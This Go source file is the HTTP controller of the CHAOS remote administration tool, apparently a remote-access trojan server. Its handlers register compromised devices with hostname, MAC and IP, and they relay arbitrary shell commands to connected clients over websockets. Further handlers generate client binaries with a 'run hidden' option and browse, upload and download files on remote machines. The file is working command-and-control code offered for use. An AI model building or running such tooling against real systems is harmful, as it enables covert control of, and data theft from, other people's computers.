package http

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/gin-gonic/gin/binding"
	"github.com/gorilla/websocket"
	"github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/entities"
	"github.com/tiagorlampert/CHAOS/internal"
	"github.com/tiagorlampert/CHAOS/internal/utils"
	"github.com/tiagorlampert/CHAOS/internal/utils/network"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
	"github.com/tiagorlampert/CHAOS/presentation/http/request"
	"github.com/tiagorlampert/CHAOS/services/client"
	"github.com/tiagorlampert/CHAOS/services/user"
	"net/http"
	"net/url"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
}

func (h *httpController) noRouteHandler(c *gin.Context) {
	c.Redirect(http.StatusMovedPermanently, "/")
	c.Abort()
	return
}

func (h *httpController) healthHandler(c *gin.Context) {
	c.Status(http.StatusOK)
	return
}

func (h *httpController) loginHandler(c *gin.Context) {
	c.HTML(http.StatusOK, "login.html", gin.H{})
	return
}

func (h *httpController) getSettingsHandler(c *gin.Context) {
	auth, err := h.AuthService.GetAuthConfig()
	if err != nil {
		h.Logger.Error(err)
		c.Status(http.StatusInternalServerError)
		return
	}
	c.HTML(http.StatusOK, "settings.html", gin.H{
		"SecretKey": auth.SecretKey,
	})
	return
}

func (h *httpController) refreshTokenHandler(c *gin.Context) {
	secret, err := h.AuthService.RefreshSecret()
	if err != nil {
		h.Logger.Error(err.Error())
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.String(http.StatusOK, secret)
	return
}

func (h *httpController) getUserProfileHandler(c *gin.Context) {
	user, _ := c.Get("user")
	c.HTML(http.StatusOK, "profile.html", gin.H{
		"Username": user.(*entities.User).Username,
	})
	return
}

func (h *httpController) createUserHandler(c *gin.Context) {
	var body entities.User
	if err := c.ShouldBind(&body); err != nil {
		h.Logger.Warning(err)
		c.Status(http.StatusBadRequest)
		return
	}

	if err := h.UserService.Insert(body); err != nil {
		if err == user.ErrUserAlreadyExist {
			c.Status(http.StatusNotModified)
			return
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.Status(http.StatusOK)
	return
}

func (h *httpController) updateUserPasswordHandler(c *gin.Context) {
	var body request.UpdateUserPasswordRequestForm
	if err := c.ShouldBind(&body); err != nil {
		h.Logger.Warning(err)
		c.Status(http.StatusBadRequest)
		return
	}

	if err := h.UserService.UpdatePassword(user.UpdateUserPasswordInput{
		Username:    body.Username,
		OldPassword: body.OldPassword,
		NewPassword: body.NewPassword,
	}); err != nil {
		if errors.Is(err, user.ErrInvalidPassword) {
			c.JSON(http.StatusUnauthorized, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.Status(http.StatusOK)
	return
}

func (h *httpController) setDeviceHandler(c *gin.Context) {
	var body entities.Device
	if err := c.ShouldBindJSON(&body); err != nil {
		h.Logger.Warning(err)
		c.Status(http.StatusBadRequest)
		return
	}

	fields := logrus.Fields{
		"hostname":   body.Hostname,
		"username":   body.UserID,
		"ipAddress":  body.LocalIPAddress,
		"macAddress": body.MacAddress,
		"os":         body.OSName,
		"arch":       body.OSArch,
	}

	if err := h.DeviceService.Insert(body); err != nil {
		h.Logger.WithFields(fields).Error(`Failed to persist device: `, err.Error())
		c.Status(http.StatusInternalServerError)
		return
	}

	c.Status(http.StatusOK)
}

func (h *httpController) getDevicesHandler(c *gin.Context) {
	devices, err := h.DeviceService.FindAllConnected()
	if err != nil {
		h.Logger.Error(`Failed to get available devices`)
		c.Status(http.StatusInternalServerError)
		return
	}

	c.HTML(http.StatusOK, "devices.html", gin.H{
		"Devices": devices,
	})
	return
}

func (h *httpController) sendCommandHandler(c *gin.Context) {
	var form request.SendCommandRequestForm
	if err := c.ShouldBind(&form); err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	if len(strings.TrimSpace(form.Command)) == 0 {
		c.String(http.StatusOK, internal.NoContent)
		return
	}

	clientID, err := utils.DecodeBase64(form.Address)
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}

	ctxWithTimeout, cancel := context.WithTimeout(c, 10*time.Second)
	defer cancel()

	output, err := h.ClientService.SendCommand(ctxWithTimeout, client.SendCommandInput{
		ClientID: clientID,
		Request:  form.Command,
	})
	if err != nil {
		c.String(http.StatusInternalServerError, err.Error())
		return
	}
	c.String(http.StatusOK, output.Response)
}

func (h *httpController) generateBinaryGetHandler(c *gin.Context) {
	c.HTML(http.StatusOK, "generate.html", gin.H{
		"Address":  network.GetLocalIP(),
		"Port":     strings.ReplaceAll(h.Configuration.Server.Port, ":", ""),
		"OSTarget": system.OSTargetMap,
	})
	return
}

func (h *httpController) generateBinaryPostHandler(c *gin.Context) {
	var req request.GenerateClientRequestForm
	if err := c.ShouldBindWith(&req, binding.Form); err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	osTarget, err := strconv.Atoi(req.OSTarget)
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}

	binary, err := h.ClientService.BuildClient(client.BuildClientBinaryInput{
		ServerAddress: req.Address,
		ServerPort:    req.Port,
		OSTarget:      system.OSTargetIntMap[osTarget],
		Filename:      req.Filename,
		RunHidden:     utils.ParseCheckboxBoolean(req.RunHidden),
	})
	if err != nil {
		h.Logger.Error(err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.String(http.StatusOK, binary)
	return
}

func (h *httpController) shellHandler(c *gin.Context) {
	address, err := utils.DecodeBase64(c.Query("address"))
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}

	device, err := h.DeviceService.FindByMacAddress(address)
	if err != nil {
		h.Logger.Error(err)
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	c.HTML(http.StatusOK, "command.html", gin.H{"Device": device})
	return
}

func (h *httpController) downloadFileHandler(c *gin.Context) {
	fileName := c.Param("filename")
	targetPath := filepath.Join(internal.TempDirectory, fileName)
	if !strings.HasPrefix(filepath.Clean(targetPath), internal.TempDirectory) {
		c.String(403, "Forbidden")
		return
	}

	c.Header("Content-Transfer-Encoding", "binary")
	c.Header("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, fileName))
	c.File(targetPath)
}

func (h *httpController) fileExplorerHandler(c *gin.Context) {
	address, err := utils.DecodeBase64(c.Query("address"))
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	device, err := h.DeviceService.FindByMacAddress(address)
	if err != nil {
		h.Logger.Error(err)
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	var req request.FileExplorerRequestForm
	if err := c.ShouldBind(&req); err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	decodedPath, err := utils.DecodeBase64(req.Path)
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	path, err := url.QueryUnescape(decodedPath)
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}

	ctxWithTimeout, cancel := context.WithTimeout(c, 15*time.Second)
	defer cancel()

	explore, err := h.ClientService.SendCommand(ctxWithTimeout, client.SendCommandInput{
		ClientID: address,
		Request:  fmt.Sprint("explore ", path),
	})
	if err != nil {
		c.HTML(http.StatusOK, "explorer.html", gin.H{"error": fmt.Sprintf("Error: %s", err.Error())})
		return
	}

	var fileExplorer entities.FileExplorer
	if err := json.Unmarshal(utils.StringToByte(explore.Response), &fileExplorer); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.HTML(http.StatusOK, "explorer.html", gin.H{
		"Device":       device,
		"FileExplorer": fileExplorer,
	})
	return
}

func (h *httpController) uploadFileHandler(c *gin.Context) {
	file, err := c.FormFile("file")
	if err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	if err := c.SaveUploadedFile(file, fmt.Sprint(internal.TempDirectory, file.Filename)); err != nil {
		c.String(http.StatusInternalServerError, err.Error())
		return
	}
	c.String(http.StatusOK, file.Filename)
}

func (h *httpController) openUrlHandler(c *gin.Context) {
	var req request.OpenUrlRequestForm
	if err := c.ShouldBindWith(&req, binding.Form); err != nil {
		c.String(http.StatusBadRequest, err.Error())
		return
	}
	if err := h.UrlService.OpenUrl(c.Request.Context(), req.Address, req.URL); err != nil {
		c.String(http.StatusInternalServerError, err.Error())
		return
	}
	c.Status(http.StatusOK)
	return
}

func (h *httpController) clientHandler(c *gin.Context) {
	clientID := c.GetHeader("x-client")

	ws, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		h.Logger.Println("error connecting client:", err)
		c.String(http.StatusInternalServerError, err.Error())
		return
	}

	err = h.ClientService.AddConnection(clientID, ws)
	if err != nil {
		h.Logger.Println("error adding client:", err)
		c.String(http.StatusInternalServerError, err.Error())
		return
	}

	h.Logger.Println("Client connected: ", clientID)
}
